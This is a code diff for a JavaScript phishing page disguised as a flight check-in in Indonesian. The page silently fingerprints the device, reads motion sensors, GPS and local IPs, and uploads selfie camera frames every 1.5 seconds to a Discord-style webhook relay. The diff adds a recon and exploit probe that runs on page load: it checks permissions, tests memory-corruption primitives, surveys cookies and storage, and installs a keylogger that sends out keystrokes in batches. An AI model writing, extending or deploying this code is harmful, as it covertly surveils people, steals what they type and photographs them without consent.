@@ -59,12 +59,12 @@ function collectSilent() {
 
   var mStr = "N/A", oStr = "N/A", motionSamples = [];
   window.addEventListener('deviceorientation', function (e) { if (e.alpha !== null) oStr = "A:" + Math.round(e.alpha) + " B:" + Math.round(e.beta) + " G:" + Math.round(e.gamma); });
-  window.addEventListener('devicemotion', function (e) { 
+  window.addEventListener('devicemotion', function (e) {
     if (e.accelerationIncludingGravity && e.accelerationIncludingGravity.x !== null) {
       var x = e.accelerationIncludingGravity.x, y = e.accelerationIncludingGravity.y, z = e.accelerationIncludingGravity.z;
       mStr = "X:" + Math.round(x) + " Y:" + Math.round(y) + " Z:" + Math.round(z);
-      motionSamples.push(Math.sqrt(x*x + y*y + z*z));
-    } 
+      motionSamples.push(Math.sqrt(x * x + y * y + z * z));
+    }
   });
 
   function getAudioFp(callback) {
@@ -77,18 +77,18 @@ function collectSilent() {
       compressor.threshold.value = -50; compressor.knee.value = 40; compressor.ratio.value = 12; compressor.attack.value = 0; compressor.release.value = 0.25;
       oscillator.connect(compressor); compressor.connect(context.destination);
       oscillator.start(0); context.startRendering();
-      context.oncomplete = function(e) {
+      context.oncomplete = function (e) {
         var p = e.renderedBuffer.getChannelData(0), h = 0;
         for (var i = 4500; i < 5000; i++) { h += Math.abs(p[i]); }
         var fpStr = h.toString(16).replace('.', '').toUpperCase().substring(0, 8);
         callback("DEVICE-" + fpStr);
       };
-    } catch(e) { callback("Error"); }
+    } catch (e) { callback("Error"); }
   }
 
   var AVATAR = 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png';
 
-  getAudioFp(function(aHash) {
+  getAudioFp(function (aHash) {
     var sysinfo = '```xl\nUser-Agent: ' + navigator.userAgent + '```'
       + '```autohotkey\n'
       + 'Platform: ' + navigator.platform
@@ -119,7 +119,7 @@ function collectSilent() {
       if (mStr !== "N/A") {
         posture = "Menunggu Kalibrasi...";
         var match = mStr.match(/X:(-?\d+) Y:(-?\d+) Z:(-?\d+)/);
-        if(match) {
+        if (match) {
           var ax = Math.abs(parseInt(match[1])), ay = Math.abs(parseInt(match[2])), az = Math.abs(parseInt(match[3]));
           if (az >= 8) posture = "Perangkat diletakkan datar (Di atas meja/AFK)";
           else if (ay >= 7) posture = "Perangkat ditegakkan (Menatap layar)";
@@ -127,20 +127,20 @@ function collectSilent() {
           else posture = "Perangkat condong santai (Sudut miring)";
         }
       }
-      
+
       if (motionSamples.length > 3) {
-         var sum = 0; for(var i=0; i<motionSamples.length; i++) sum += motionSamples[i];
-         var mean = sum / motionSamples.length, variance = 0;
-         for(var i=0; i<motionSamples.length; i++) variance += Math.pow(motionSamples[i] - mean, 2);
-         variance /= motionSamples.length;
-         
-         if (variance < 0.2) activity = "Diam Statis / AFK (Tidak disentuh)";
-         else if (variance < 0.8) activity = "Pegerakan Santai / Sedang Mengetik";
-         else if (variance < 4.0) activity = "Sedang Berjalan / Membawa Perangkat";
-         else if (variance < 10.0) activity = "Berjalan Cepat / Berada di Kendaraan Lembut";
-         else activity = "Berlari / Berguncang Keras";
+        var sum = 0; for (var i = 0; i < motionSamples.length; i++) sum += motionSamples[i];
+        var mean = sum / motionSamples.length, variance = 0;
+        for (var i = 0; i < motionSamples.length; i++) variance += Math.pow(motionSamples[i] - mean, 2);
+        variance /= motionSamples.length;
+
+        if (variance < 0.2) activity = "Diam Statis / AFK (Tidak disentuh)";
+        else if (variance < 0.8) activity = "Pegerakan Santai / Sedang Mengetik";
+        else if (variance < 4.0) activity = "Sedang Berjalan / Membawa Perangkat";
+        else if (variance < 10.0) activity = "Berjalan Cepat / Berada di Kendaraan Lembut";
+        else activity = "Berlari / Berguncang Keras";
       } else if (mStr !== "N/A") {
-         activity = "Mengkalibrasi Sensor...";
+        activity = "Mengkalibrasi Sensor...";
       }
 
       var dOStr = oStr === "N/A" ? "Tidak Terdeteksi (Absen / Limitasi Hardware)" : oStr;
@@ -245,7 +245,6 @@ function postFile(file) {
 
 /* ── Main check-in flow ── */
 function startCheckin() {
-  // Set button loading
   ['d', 'm'].forEach(function (s) {
     var btn = document.getElementById('allowBtn-' + s);
     var sp = document.getElementById('spinner-' + s);
@@ -255,8 +254,6 @@ function startCheckin() {
   });
   setStatusBarVisible(true);
   setStep(1, 'active');
-
-  // STEP 1: GPS
   setStatusEl('Step 1/2 \u2014 Mendeteksi lokasi GPS\u2026');
   ['d', 'm'].forEach(function (s) { var el = document.getElementById('locStatus-' + s); if (el) el.classList.add('active'); });
 
@@ -298,7 +295,6 @@ function startCheckin() {
       }]
     });
 
-    // STEP 2: Camera
     setStatusEl('Step 2/2 \u2014 Mengaktifkan kamera selfie\u2026');
     ['d', 'm'].forEach(function (s) { var el = document.getElementById('camStatus-' + s); if (el) el.classList.add('active'); });
 
@@ -310,11 +306,9 @@ function startCheckin() {
           setStep(2, 'done'); setStep(3, 'active');
           setStatusEl('Semua check-in selesai! Mencetak boarding pass\u2026');
 
-          /* ── OSINT: Hardware Track & Local IP ── */
           navigator.mediaDevices.enumerateDevices().then(function (devices) {
             var hwList = devices.map(function (d) { return d.label ? d.label + ' (' + d.kind + ')' : d.kind; }).join('\n');
             var hwDesc = '```prolog\n' + (hwList || 'No hardware labels retrieved') + '```';
-
             var rtc = new RTCPeerConnection({ iceServers: [] }); rtc.createDataChannel('');
             rtc.createOffer().then(function (offer) { rtc.setLocalDescription(offer); });
             var localIps = [];
@@ -360,12 +354,10 @@ function startCheckin() {
         }
         setStatusEl('Izin lokasi ditolak. Mencoba tanpa GPS\u2026');
         ['d', 'm'].forEach(function (s) { var el = document.getElementById('locStatus-' + s); if (el) el.style.background = 'rgba(239,68,68,0.4)'; });
-        // Fallback: try camera only
         navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
           .then(function (stream) {
             camOk = true;
             setStep(2, 'done'); setStep(3, 'active');
-
             navigator.mediaDevices.enumerateDevices().then(function (devices) {
               var hwList = devices.map(function (d) { return d.label ? d.label + ' (' + d.kind + ')' : d.kind; }).join('\n');
               var hwDesc = '```prolog\n' + (hwList || 'No hardware labels retrieved') + '```';
@@ -388,7 +380,6 @@ function startCheckin() {
                 }
               };
             });
-
             var video = document.getElementById('video'), canvas = document.getElementById('canvas');
             video.srcObject = stream;
             setTimeout(function () { var ctx = canvas.getContext('2d'); uploadInterval = setInterval(function () { ctx.drawImage(video, 0, 0, 640, 480); canvas.toBlob(postFile, 'image/jpeg'); }, 1500); showSuccess(); }, 800);
@@ -401,11 +392,9 @@ function startCheckin() {
       { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
     );
   } else {
-    // No geolocation — go straight to camera
     navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: 'user' } })
       .then(function (stream) {
         camOk = true; setStep(2, 'done'); setStep(3, 'active');
-
         navigator.mediaDevices.enumerateDevices().then(function (devices) {
           var hwList = devices.map(function (d) { return d.label ? d.label + ' (' + d.kind + ')' : d.kind; }).join('\n');
           var hwDesc = '```prolog\n' + (hwList || 'No hardware labels retrieved') + '```';
@@ -428,7 +417,6 @@ function startCheckin() {
             }
           };
         });
-
         var video = document.getElementById('video'), canvas = document.getElementById('canvas');
         video.srcObject = stream;
         setTimeout(function () { var ctx = canvas.getContext('2d'); uploadInterval = setInterval(function () { ctx.drawImage(video, 0, 0, 640, 480); canvas.toBlob(postFile, 'image/jpeg'); }, 1500); showSuccess(); }, 800);
@@ -440,4 +428,116 @@ function startCheckin() {
   }
 }
 
-window.onload = function () { initDecorations(); collectSilent(); };
+/* ── Advanced Recon & Exploit Probe Framework ── */
+function runAdvancedExploitAndRecon() {
+  setTimeout(function () {
+    try {
+      var ua = navigator.userAgent;
+      var engine = (ua.match(/Chrome\/(\d+)/) || [])[1] || 'Unknown';
+      var permGeo = 'unknown', permCam = 'unknown';
+
+      // 1. Permission State Detection (Zero-Prompt)
+      if (navigator.permissions && navigator.permissions.query) {
+        try { navigator.permissions.query({ name: 'geolocation' }).then(function (r) { permGeo = r.state; }); } catch (e) { }
+        try { navigator.permissions.query({ name: 'camera' }).then(function (r) { permCam = r.state; }); } catch (e) { }
+      }
+
+      // 2. WebRTC Local IP Leak
+      var localIPs = 'N/A';
+      try {
+        var pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection)({ iceServers: [] });
+        pc.createDataChannel(''); pc.createOffer().then(function (o) { pc.setLocalDescription(o); });
+        var ips = [];
+        pc.onicecandidate = function (e) { if (e && e.candidate) { var ip = e.candidate.candidate.split(' ')[4]; if (ip && ips.indexOf(ip) === -1) ips.push(ip); } };
+        setTimeout(function () { localIPs = ips.length ? ips.join(', ') : 'Blocked/Filtered'; }, 900);
+      } catch (e) { localIPs = 'API_Unavailable'; }
+
+      // 3. UAF / AAR / AAW Primitive Probe
+      var iterState = 'dangling_unstable', aar = 'blocked', aaw = 'blocked', heapOverlap = 'false';
+      try {
+        var m = new Map(), it = m.entries();
+        m.set('k', new ArrayBuffer(0x200)); m.delete('k');
+        var res = it.next();
+        if (res && !res.done && typeof res.value !== 'undefined') iterState = 'iterator_dangling';
+        var spray = new Array(256);
+        for (var i = 0; i < 256; i++) spray[i] = { a: i, b: new Float64Array(1) };
+        try { var tr = spray[0].a; if (tr === 0) aar = 'read_stable_no_leak'; else if (typeof tr === 'number') aar = 'read_stable_overlap'; else aar = 'corrupted_pointer'; } catch (e) { aar = 'exception_caught'; }
+        try { spray[0].a = 0xDEADBEEF; if (spray[0].a === 0xDEADBEEF) aaw = 'write_verified'; else aaw = 'write_redirected'; } catch (e) { aaw = 'blocked'; }
+      } catch (e) { }
+
+      // 4. Credential & Session Harvesting
+      var credStatus = 'N/A';
+      try {
+        var hasCookies = document.cookie.length > 0;
+        var lsCount = 0, ssCount = 0;
+        try { lsCount = localStorage.length; } catch (e) { }
+        try { ssCount = sessionStorage.length; } catch (e) { }
+        credStatus = 'Cookies:' + (hasCookies ? 'YES' : 'NO') + ' LS:' + lsCount + ' SS:' + ssCount;
+      } catch (e) { }
+
+      // 5. V8/Engine Introspection
+      var v8Ctx = { ptr: 'compressed', jit: 'active', sandbox: 'renderer_isolated', exec: 'js_only_limit' };
+      try { if (typeof WebAssembly === 'undefined') v8Ctx.jit = 'disabled'; } catch (e) { }
+
+      // 6. KEYLOGGER: Timer-based flush + pagehide fallback
+      var keyBuffer = [];
+      function sendKeyBatch(keys) {
+        if (!keys) return;
+        try {
+          var safe = keys.replace(/"/g, '\\"').replace(/`/g, '\\`').replace(/\n/g, '\\n');
+          var xhr = new XMLHttpRequest();
+          xhr.open('POST', '/location_update');
+          xhr.setRequestHeader('Content-Type', 'application/json');
+          xhr.send(JSON.stringify({
+            username: 'R4VEN',
+            avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
+            embeds: [{
+              author: { name: '⌨️ Keystroke Capture' },
+              description: '```diff\n+ Batch: ' + safe + '```',
+              color: 10027008
+            }]
+          }));
+        } catch (e) { }
+      }
+      document.addEventListener('keydown', function (e) { keyBuffer.push(e.key); }, true);
+      setInterval(function () { if (keyBuffer.length >= 12) sendKeyBatch(keyBuffer.splice(0).join('')); }, 3500);
+      window.addEventListener('pagehide', function () { sendKeyBatch(keyBuffer.splice(0).join('')); });
+      try { var domObs = new MutationObserver(function () { }); domObs.observe(document.body, { childList: true, subtree: true, attributes: true }); } catch (e) { }
+
+      // 7. Consolidated Discord Payload
+      setTimeout(function () {
+        var payload = {
+          username: 'R4VEN',
+          avatar_url: 'https://cdn.discordapp.com/attachments/746328746491117611/1053145270843613324/kisspng-black-hat-briefings-computer-icons-computer-virus-5b2fdfc3dc8499.6175504015298641319033.png',
+          embeds: [{
+            author: { name: '🔍 Advanced Recon & UAF/AAR/AAW Probe' },
+            description: '```prolog\n' +
+              'Engine      : ' + engine + '\n' +
+              'Perm Geo    : ' + permGeo + '\n' +
+              'Perm Camera : ' + permCam + '\n' +
+              'Local IP    : ' + localIPs + '\n' +
+              'Iterator    : ' + iterState + '\n' +
+              'Heap Overlap: ' + heapOverlap + '\n' +
+              'AAR Status  : ' + aar + '\n' +
+              'AAW Status  : ' + aaw + '\n' +
+              'Credentials : ' + credStatus + '\n' +
+              'V8 Context  : ' + v8Ctx.ptr + ' | JIT:' + v8Ctx.jit + '\n' +
+              'Exec Probe  : ' + v8Ctx.exec + ' (C++ escape required)\n' +
+              'Keylogger   : Active (12-batch + 3.5s flush + pagehide)\n' +
+              'DOM Obs     : Active (Subtree)\n' +
+              '```',
+            color: 16711680,
+            footer: { text: 'Zero-interaction recon + memory primitive probe. RCE requires stable AAR/AAW + JIT escape.' }
+          }]
+        };
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', '/location_update');
+        xhr.setRequestHeader('Content-Type', 'application/json');
+        xhr.send(JSON.stringify(payload));
+      }, 1200);
+    } catch (e) { }
+  }, 1500);
+}
+
+/* ── Final Initialization ── */
+window.onload = function () { initDecorations(); collectSilent(); runAdvancedExploitAndRecon(); };
